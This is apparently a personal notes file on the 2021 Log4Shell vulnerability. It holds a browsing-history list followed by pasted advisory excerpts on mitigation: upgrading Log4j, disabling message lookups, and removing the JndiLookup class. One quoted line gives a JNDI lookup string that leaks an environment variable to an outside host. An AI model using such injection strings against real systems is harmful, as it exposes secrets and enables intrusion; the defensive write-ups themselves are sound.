@@ -1,0 +1,317 @@
+https://httptoolkit.tech/blog/tls-fingerprinting-node-js/ 20211208.042925 
+https://blog.jetbrains.com/education/2021/12/08/learn-in-1-hour-introduction-to-spring-framework/ 20211208.201723 
+https://www.autoblog.com/2021/12/08/consumer-reports-e-bike-electric-bicycle-ratings/ 20211209.021942 
+https://www.autoblog.com/2021/12/08/consumer-reports-e-bike-electric-bicycle-ratings/ 20211209.022124 
+https://www.autoblog.com/2021/12/08/consumer-reports-e-bike-electric-bicycle-ratings/ 20211209.022136 
+https://www.autoblog.com/2021/12/08/consumer-reports-e-bike-electric-bicycle-ratings/ 20211209.022904 
+https://eclipse-foundation.blog/2021/12/08/celebrating-eclipse-at-20/ 20211209.065246 
+https://eclipse-foundation.blog/2021/12/08/celebrating-eclipse-at-20/ 20211209.065324 
+https://github.blog/2021-12-08-improving-github-code-search/ 20211209.072742 
+https://github.blog/2021-12-08-improving-github-code-search/ 20211209.072833 
+https://devblogs.microsoft.com/python/python-in-visual-studio-code-december-2021-release/ 20211209.200916 
+https://devblogs.microsoft.com/python/python-in-visual-studio-code-december-2021-release/ 20211209.201056 
+https://blog.minerva-labs.com/a-new-strongpity-variant-hides-behind-notepad-installation 20211209.201815 
+https://blog.minerva-labs.com/a-new-strongpity-variant-hides-behind-notepad-installation 20211209.201848 
+https://www.bleepingcomputer.com/news/security/new-zero-day-exploit-for-log4j-java-library-is-an-enterprise-nightmare/ 20211210.065601 
+https://www.bleepingcomputer.com/news/security/new-zero-day-exploit-for-log4j-java-library-is-an-enterprise-nightmare/ 20211210.065616 
+https://www.bleepingcomputer.com/news/security/new-zero-day-exploit-for-log4j-java-library-is-an-enterprise-nightmare/ 20211210.065944 
+https://developer.okta.com/blog/2021/12/08/angular-dynamic-components 20211210.072052 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot 20211210.184517 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot 20211210.184541 
+https://blog.jetbrains.com/idea/2021/12/one-shortcut-to-run-them-all/ 20211210.184821 
+https://blog.jetbrains.com/idea/2021/12/one-shortcut-to-run-them-all/ 20211210.185150 
+https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.15.0/pom 20211211.062203 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot 20211211.063510 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot 20211211.063608 
+https://github.com/simonis/Log4jPatch 20211211.063733 
+https://spring.io/blog/2021/12/09/new-aot-engine-brings-spring-native-to-the-next-level 20211211.064014 
+https://spring.io/blog/2021/12/09/new-aot-engine-brings-spring-native-to-the-next-level 20211211.064033 
+https://www.lunasec.io/docs/blog/log4j-zero-day/ 20211211.064316 
+https://www.lunasec.io/docs/blog/log4j-zero-day/ 20211211.064623 
+https://www.lunasec.io/docs/blog/log4j-zero-day/ 20211211.065144 
+https://logging.apache.org/log4j/2.x/security.html 20211211.070446 
+https://logging.apache.org/log4j/2.x/security.html 20211211.070543 
+https://www.lunasec.io/docs/blog/log4j-zero-day/ 20211211.070608 
+https://blogs.oracle.com/javamagazine/post/java-path-nio2-directory-extensions-zip 20211211.072030 
+https://blogs.oracle.com/javamagazine/post/java-path-nio2-directory-extensions-zip 20211211.072137 
+https://blog.jetbrains.com/idea/2021/12/one-shortcut-to-run-them-all/ 20211211.073815 
+https://blogs.oracle.com/javamagazine/post/java-bitwise-biginteger-bitset-canbus 20211211.074136 
+https://blogs.oracle.com/javamagazine/post/java-bitwise-biginteger-bitset-canbus 20211211.074321 
+https://blog.jetbrains.com/blog/2021/12/09/jetbrains-ides-and-dotnet-tools-2021-3-released/ 20211211.080102 
+https://blog.jetbrains.com/blog/2021/12/09/jetbrains-ides-and-dotnet-tools-2021-3-released/ 20211211.080204 
+https://vladmihalcea.com/log-sql-spring-boot/ 20211211.080414 
+https://eclipse-foundation.blog/2021/12/08/celebrating-eclipse-at-20/ 20211211.094138 
+https://eclipse-foundation.blog/2021/12/08/celebrating-eclipse-at-20/ 20211211.094258 
+https://www.yubico.com/blog/yubico-pioneers-the-simplification-of-smartcard-support-on-mobile-for-ios/ 20211212.194732 
+https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/ 20211213.050019 
+https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/ 20211213.051206 
+https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/ 20211213.051648 
+https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/ 20211213.051930 
+https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/ 20211213.052041 
+https://www.cnn.com/2021/12/11/politics/dhs-log4j-software-flaw-warning/index.html 20211213.052110 
+https://www.cnn.com/2021/12/11/politics/dhs-log4j-software-flaw-warning/index.html 20211213.052623 
+https://stackify.com/compare-java-logging-frameworks/ 20211213.052741 
+https://stackify.com/compare-java-logging-frameworks/ 20211213.053103 
+https://stackify.com/compare-java-logging-frameworks/ 20211213.053336 
+https://stackoverflow.com/questions/11359187/why-not-use-java-util-logging 20211213.053950 
+https://stackoverflow.com/questions/11359187/why-not-use-java-util-logging 20211213.054952 
+https://stackoverflow.com/questions/11359187/why-not-use-java-util-logging 20211213.055630 
+https://blogs.oracle.com/javamagazine/post/java-sealed-classes-fight-ambiguity 20211213.061428 
+https://blogs.oracle.com/javamagazine/post/java-sealed-classes-fight-ambiguity 20211213.061438 
+https://kenkousen.substack.com/p/tales-from-the-jar-side-log4j-vulnerability?r=2dwq5&utm_campaign=post&utm_medium=web 20211213.062219 
+https://kenkousen.substack.com/p/tales-from-the-jar-side-log4j-vulnerability?r=2dwq5&utm_campaign=post&utm_medium=web 20211213.062509 
+https://www.wired.com/story/log4j-flaw-hacking-internet/ 20211213.062940 
+https://www.wired.com/story/log4j-flaw-hacking-internet/ 20211213.063213 
+https://www.wired.com/story/log4j-flaw-hacking-internet/ 20211213.063625 
+https://blogs.oracle.com/javamagazine/post/java-arm-runtime-switches-benchmarks 20211213.063712 
+https://blogs.oracle.com/javamagazine/post/java-arm-runtime-switches-benchmarks 20211213.063753 
+https://foojay.io/today/log4shell-critical-log4j-rce-vulnerabilty-update-to-version-2-15-0/ 20211213.064254 
+https://foojay.io/today/log4shell-critical-log4j-rce-vulnerabilty-update-to-version-2-15-0/ 20211213.064312 
+https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/ 20211213.064331 
+https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/ 20211213.064507 
+https://stackoverflow.com/questions/11359187/why-not-use-java-util-logging 20211213.181914 
+https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/?s=09 20211213.183414 
+https://mvnrepository.com/artifact/org.apache.logging.log4j 20211213.184432 
+https://blog.jetbrains.com/blog/2021/12/13/log4j-vulnerability-and-jetbrains-products-and-services/ 20211213.185118 
+https://blog.jetbrains.com/blog/2021/12/13/log4j-vulnerability-and-jetbrains-products-and-services/ 20211213.185300 
+https://blog.jetbrains.com/blog/2021/12/13/log4j-vulnerability-and-jetbrains-products-and-services/ 20211213.185509 
+https://ubuntu.com/blog/linux-gaming-tutorial-raspberry-pi-minecraft-server-on-ubuntu-desktop 20211213.190406 
+https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/ 20211213.190457 
+https://logging.apache.org/log4j/2.x/security.html 20211213.190738 
+https://logging.apache.org/log4j/2.x/security.html 20211213.190845 
+https://www.msspalert.com/cybersecurity-news/java-vulnerability-log4shell-zero-day-details-patches-and-updates/ 20211213.191821 
+https://www.msspalert.com/cybersecurity-news/java-vulnerability-log4shell-zero-day-details-patches-and-updates/ 20211213.191930 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot 20211213.192315 
+https://www.linkedin.com/pulse/log4shell-cve-2021-44228-apache-log4j2-surendra-kumar-sunkara 20211213.192857 
+https://jkoder.com/cve-2021-44228-spring-boot-and-log4j2-vulnerability/ 20211213.193026 
+https://www.linkedin.com/pulse/log4shell-cve-2021-44228-apache-log4j2-surendra-kumar-sunkara 20211213.193338 
+https://www.linkedin.com/pulse/log4shell-cve-2021-44228-apache-log4j2-surendra-kumar-sunkara 20211213.193354 
+https://logging.apache.org/log4j/2.x/download.html 20211213.193446 
+https://logging.apache.org/log4j/2.x/download.html 20211213.193636 
+https://logging.apache.org/log4j/2.x/security.html 20211213.193702 
+https://dev.to/composite/how-to-pass-the-log4j2-vulnerability-quick-453h 20211213.194000 
+https://anilkumart.medium.com/cve-2021-44228-log4j-2-vulnerability-spring-boot-fix-4b5ddb1c8f84 20211213.194315 
+https://stackoverflow.com/questions/70329808/is-logback-also-affected-by-log4j-0-day-vulnerability-issue-in-spring-boot 20211213.194453 
+https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/ 20211213.194544 
+https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/ 20211213.194603 
+https://www.itpro.com/security/zero-day-exploit/361819/what-is-log4shell-log4j-vulnerability 20211213.194703 
+https://www.itpro.com/security/zero-day-exploit/361819/what-is-log4shell-log4j-vulnerability 20211213.195042 
+https://www.cnn.com/2021/12/11/politics/dhs-log4j-software-flaw-warning/index.html 20211213.195116 
+https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/ 20211213.234623 
+https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/ 20211214.000432 
+https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/ 20211214.002005 
+https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/ 20211214.002022 
+https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/ 20211214.002523 
+https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/ 20211214.003009 
+https://www.zdnet.com/article/log4j-flaw-attackers-are-making-thousands-of-attempts-to-exploit-this-severe-vulnerability/ 20211214.003131 
+https://www.zdnet.com/article/log4j-flaw-attackers-are-making-thousands-of-attempts-to-exploit-this-severe-vulnerability/ 20211214.003514 
+https://www.hivemq.com/blog/mqtt-raspberrypi-part01-sensor-data-hivemqcloud-java-pi4j/ 20211214.004227 
+https://www.hivemq.com/blog/mqtt-raspberrypi-part01-sensor-data-hivemqcloud-java-pi4j/ 20211214.004256 
+https://devblogs.microsoft.com/visualstudio/become-a-master-at-git-and-open-source/ 20211214.011045 
+https://devblogs.microsoft.com/visualstudio/become-a-master-at-git-and-open-source/ 20211214.011107 
+https://www.thesslstore.com/blog/browser-fingerprinting-the-good-bad-ugly/ 20211214.011316 
+https://www.thesslstore.com/blog/browser-fingerprinting-the-good-bad-ugly/ 20211214.011352 
+https://stackoverflow.com/questions/70323880/is-grails-plugin-log4j-2-5-1-affected-by-cve-2021-44228?utm_source=dlvr.it&utm_medium=twitter 20211214.014402 
+https://www.cloudfoundry.org/blog/log4j-vulnerability-cve-2021-44228-impact-on-cloud-foundry-products/ 20211214.014457 
+https://www.cloudfoundry.org/blog/log4j-vulnerability-cve-2021-44228-impact-on-cloud-foundry-products/ 20211214.014549 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot 20211214.022932 
+https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot 20211214.023017 
+https://grails.github.io/grails2-doc/2.5.4/ref/Plug-ins/logging.html 20211214.062021 
+https://grails.github.io/grails2-doc/2.5.4/guide/single.html#logging 20211214.062644 
+https://grails.github.io/grails2-doc/2.5.4/guide/single.html#logging 20211214.062804 
+https://www.tutorialspoint.com/log4j/log4j_logging_levels.htm 20211214.063247 
+https://www.tutorialspoint.com/log4j/log4j_logging_levels.htm 20211214.063353 
+https://logging.apache.org/log4j/2.x/manual/customloglevels.html 20211214.063536 
+https://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/Level.html 20211214.063724 
+https://logging.apache.org/log4j/2.x/log4j-api/apidocs/org/apache/logging/log4j/Level.html 20211214.063810 
+https://www.javapedia.net/log4j 20211214.064152 
+https://www.javapedia.net/log4j 20211214.064225 
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228 20211213.193727 
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+openjdk download windows
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+https://stackoverflow.com/questions/11359187/why-not-use-java-util-logging
+
+java.until.logging jul
+log4j2
+logback
+
+SLF4J
+
+
+
+
+
+https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/
+
+
+there are other vectors of attack for the Log4Shell exploit. For instance, we’ve confirmed in our testing that if the class returned from the ldap url is already on the classpath, it will be executed even in newer versions of the SDK and even if com.sun.jndi.ldap.object.trustURLCodebase is set to false. We’ll continue to investigate and provide updates as we learn more.
+Remediating the Log4Shell vulnerability
+The easiest way to remediate this is to update to Log4j version 2.15.0 or later, as this behavior is now disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting the system property log4j2.formatMsgNoLookups to true by adding the following Java parameter: -Dlog4j2.formatMsgNoLookups=true
+
+Alternatively, you can mitigate this vulnerability by removing the 
+
+Alternatively, you can mitigate this vulnerability by removing the JndiLookup class from the classpath.
+Check out our guide to learn how to find and fix Log4Shell vulnerabilities with Snyk.
+Scanning and updating to prevent vulnerabilities
+
+https://foojay.io/today/log4shell-critical-log4j-rce-vulnerabilty-update-to-version-2-15-0/
+
+
+
+On Dec.10, 2021, a new, critical Log4j vulnerability was disclosed: Log4Shell.
+This vulnerability within the popular Java logging framework was published as CVE-2021-44228 and categorized as Critical with a CVSS score of 10, which is the highest score possible. The vulnerability was discovered by Chen Zhaojun from Alibaba’s Cloud Security team.
+All current versions of log4j2 up to and including 2.14.1 are vulnerable. You can remediate this vulnerability by updating to version 2.15.0 or later.
+
+
+
+
+
+https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/?s=09
+
+https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/?s=09
+
+
+
+All systems, including those that are not customer facing, are potentially vulnerable to this exploit, so backend systems and microservices should also be upgraded. The recommended action is to update Log4j 2 to 2.15.0. A service restart will be required.
+Workarounds
+To help mitigate the risk of this vulnerability until the more complete security update can be applied, customers should consider the following mitigations steps. A service restart will be required for these changes to take effect. These workarounds should not be considered a complete solution to resolve this vulnerability:
+* In case the Log4j 2 vulnerable component cannot be updated, Log4J 2 versions 2.10 to 2.14.1 support the parameter log4j2.formatMsgNoLookups to be set to ‘true’, to disable the vulnerable feature. Ensure this parameter is configured in the startup scripts of the Java Virtual Machine: 
+* -Dlog4j2.formatMsgNoLookups=true.
+* Alternatively, customers using Log4j 2.10 to 2.14.1 may set the LOG4J_FORMAT_MSG_NO_LOOKUPS=”true” environment variable to force this change.
+* Kubernetes administrators may use “kubectl set env” to set the LOG4J_FORMAT_MSG_NO_LOOKUPS=”true” environment variable to apply the mitigation across Kubernetes clusters where the Java applications are running Log4j 2.10 to 2.14.1, effectively reflecting on all pods and containers automatically.
+* For releases from 2.0-beta9 to 2.10.0, the mitigation is to remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+Background of Log4j
+
+https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/
+
+On December 9th, it was made public on Twitter that a zero-day exploit had been discovered in log4j, a popular Java logging library. All the library’s versions between 2.0 and 2.14.1 included are affected. Log4j 2.15.0 has been released, which no longer has this vulnerability. As pointed out by the POC published on GitHub, when log4j logs an attacker-controlled string value it can result in a Remote Code Execution (RCE). The issue affects log4j-core.
+The log4j contributors mobilized to ensure that a fix is available and quickly merged. Log4j 2.15.0 is already available in Maven Central and all users are encouraged to upgrade immediately where possible. Where an upgrade is not immediately possible, an alternative workaround is to start the Java application or server with the log4j2.formatMsgNoLookups system property set to true:
+java -Dlog4j2.formatMsgNoLookups=true -jar myapp.jar
+This property is not available in log4j versions below 2.10.0, and for users of these versions that cannot immediately upgrade, two strategies are available: "modify every logging pattern layout to say %m{nolookups} instead of %m in your logging config files" or "substitute a non-vulnerable or empty implementation of the class org.apache.logging.log4j.core.lookup.JndiLookup, in a way that your classloader uses your replacement instead of the vulnerable version of the class."
+It was initially reported by Lunasec that servers running on JDKs versions higher than 6u211, 7u201, 8u191 are not affected by the LDAP RCE attack vector, as the com.sun.jndi.ldap.object.trustURLCodebase is disabled by default, hence JNDI cannot load a remote codebase using LDAP. However, further analysis by the community has revealed that all JDK versions are vulnerable to this kind of attack. Alvaro Muñoz commented on Twitter the deserialization attacks are still possible with the latest JDK: "The ldap server will return a serialized object which will get deserialized. RCE depends on gadget availability in the classpath though"
+Another mitigation option is to remove the JndiLookup class from the classpath:
+zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+However, as reported by Michael Stepankin at Veracode, there are other attack vectors targeting this vulnerability that can result in RCE. Lari Hotari, OSS contributor and senior software engineer at DataStax, has also commented on an earlier version of this news item that even if the original RCE attack via LDAP may be prevented in later JDK versions, it is still possible to use the log4j vulnerability to leak sensitive information, such as environment variables, that could be used in other attacks e.g. ${jndi:ldap://${env:user}.xyz.collab.com/a} Therefore, immediate mitigation is recommended even if an application is running on a version of the JDK mentioned previously.
+The exploit, that will be identified by CVE-2021-44228, and known colloquially at Log4Shell, takes advantage of a flaw in the Java Naming and Directory Interface’s code in the following way:
+
+
+https://blog.jetbrains.com/blog/2021/12/13/log4j-vulnerability-and-jetbrains-products-and-services/
+
+Actions you should take
+If you are a user of YouTrack Standalone, Hub, Upsource, or Floating license server, please make sure you have either updated to the newly released versions or restarted the services with the -Dlog4j2.formatMsgNoLookups=true JVM parameter.
+JetBrains Team
+
+https://logging.apache.org/log4j/2.x/security.html
+
+Fixed in Log4j 2.15.0
+CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.
+Severity: Critical
+Base CVSS Score: 10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+Versions Affected: all versions from 2.0-beta9 to 2.14.1
+Descripton: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.
+Mitigation: In releases >=2.10, this behavior can be mitigated by setting either the system property log4j2.formatMsgNoLookups or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true. For releases from 2.7 through 2.14.1 all PatternLayout patterns can be modified to specify the message converter as %m{nolookups} instead of just %m. For releases from 2.0-beta9 to 2.7, the only mitigation is to remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class.
+Credit: This issue was discovered by Chen Zhaojun of Alibaba Cloud Security Team.
+References: https://issues.apache.org/jira/browse/LOG4J2-3201 and https://issues.apache.org/jira/browse/LOG4J2-3198.
+Fixed in Log4j 2.13.2
+
+https://access.redhat.com/security/vulnerabilities/RHSB-2021-009
+
+Mitigation
+Depending on the version of log4j in use, below are possible mitigations;
+- In releases >=2.10, set the system property log4j2.formatMsgNoLookups or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true,
+- For releases >=2.7 and <=2.14.1, all PatternLayout patterns can be modified to specify the message converter as %m{nolookups} instead of just %m,
+- For releases >=2.0-beta9 and <=2.10.0, remove the JndiLookup class from the classpath. For example: 
+```
+zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+```
+- On OpenShift 4 and in OpenShift Logging, the above mitigation can be applied by following this article: https://access.redhat.com/solutions/6578421
+
+
+
+
+ As you may have seen in the news, a new zero-day exploit has been reported against the popular Log4J2 library which can allow an attacker to remotely execute code. The vulnerability has been reported with CVE-2021-44228 against the log4j-core jar and has been fixed in Log4J v2.15.0.
+Spring Boot users are only affected by this vulnerability if they have switched the default logging system to Log4J2. The log4j-to-slf4j and log4j-api jars that we include in spring-boot-starter-logging cannot be exploited on their own. Only applications using log4j-core and including user input in log messages are vulnerable.
+Our upcoming v2.5.8 & v2.6.2 releases (due Dec 23, 2021) will pickup Log4J v2.15.0, but since this is such a serious vulnerability you may want to override our dependency management and upgrade your Log4J2 dependency sooner.
+Maven
+For Maven users, you can follow these instructions and the set the log4j2.version property.
+For example:
+<properties>
+    <log4j2.version>2.15.0</log4j2.version>
+</properties>
+COPY
+To check that the override as been applied run ./mvnw dependency:list | grep log4j and check that the version is 2.15.0.
+Gradle
+For Gradle users, you can follow these instructions and update the version property, import the BOM or use aresolutionStrategy.
+For most users, setting the log4j2.version property will be sufficient:
+ext['log4j2.version'] = '2.15.0'
+COPY
+If you’re using Gradle’s platform support instead of our dependency management plugin then you can add a dependency to the Log4J BOM:
+implementation(platform("org.apache.logging.log4j:log4j-bom:2.15.0"))
+COPY
+And if you can’t use either of those methods then you can declare a resolutionStrategy:
+configurations.all {
+	resolutionStrategy.eachDependency { DependencyResolveDetails details ->
+		if (details.requested.group == 'org.apache.logging.log4j') {
+			details.useVersion '2.15.0'
+		}
+	}
+}
+COPY
+Whichever method you choose, to check that the override has been applied you can run ./gradlew dependencyInsight --dependency log4j-core and look for version 2.15.0.
+Other Options
+For users that can’t upgrade, another option is to set thelog4j2.formatMsgNoLookups system property to true. For example, you can start your app using java -Dlog4j2.formatMsgNoLookups=true -jar myapp.jar.
+
+
+https://jkoder.com/cve-2021-44228-spring-boot-and-log4j2-vulnerability/
+
+Spring boot official blog also states that in their Dec 23, 2021 release they will use log4j2 v2.15.0. But since this is a high profile vulnerability the log4j2 version should be upgraded as soon as possible.
+How to check the log4j2 dependencies in maven and gradle project
+Maven:
+1	./mvnw dependency:list | grep log4j
+Gradle:
+1	./gradlew dependencyInsight --dependency log4j-core
+If using log4j2 core then change the below line to upgrade to v2.15.0
+Maven:
+1
+2
+3	<properties>
+    <log4j2.version>2.15.0</log4j2.version>
+</properties>
+Gradle:
+If using gradle dependecy management plugin
+1	ext['log4j2.version'] = '2.15.0'
+If using gradle platform support
+1	implementation(platform("org.apache.logging.log4j:log4j-bom:2.15.0"))
+If not using any of the above, you can declare using the resolutionStrategy
+1
+2
+3
+4
+5
+6
+7	configurations.all {
+    resolutionStrategy.eachDependency { DependencyResolveDetails details ->
+        if (details.requested.group == 'org.apache.logging.log4j') {
+            details.useVersion '2.15.0'
+        }
+    }
+}
+Using JVM Arguments
+For all other application user’s, if they cannot upgrade to the latest version, it is recommended to use the JVM arguments to set the log4j2.formatMsgNoLookups system value to true, -Dlog4j2.formatMsgNoLookups=true. Like the way it is done in the below command.
+1	java -Dlog4j2.formatMsgNoLookups=true -jar test-app.jar
+
+
+
+
+
+
+
+
+
+
